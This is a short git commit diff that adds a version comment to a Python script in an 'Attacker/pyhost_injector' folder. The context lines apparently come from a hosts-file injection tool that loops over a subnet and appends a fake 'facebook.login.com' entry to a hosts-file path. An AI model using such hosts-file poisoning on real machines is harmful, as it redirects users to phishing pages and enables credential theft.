8c9df74d0013538417bdd4196c7f444554f5b3b9
nu11secur1ty <venvaropt@gmail.com>
2019-11-22 10:59:55 +0200

    Update 1010100.py

--- Attacker/pyhost_injector/1010100.py
+++ Attacker/pyhost_injector/1010100.py
@@ -1,5 +1,6 @@
 #!/usr/bin/python3
 # Author V.Varbanovski @nu11secur1ty
+# v-1.0
 import ipaddress
 for ip in ipaddress.IPv4Network('10.10.10.0/24'):
     host = "facebook.login.com >> %hostspath%"
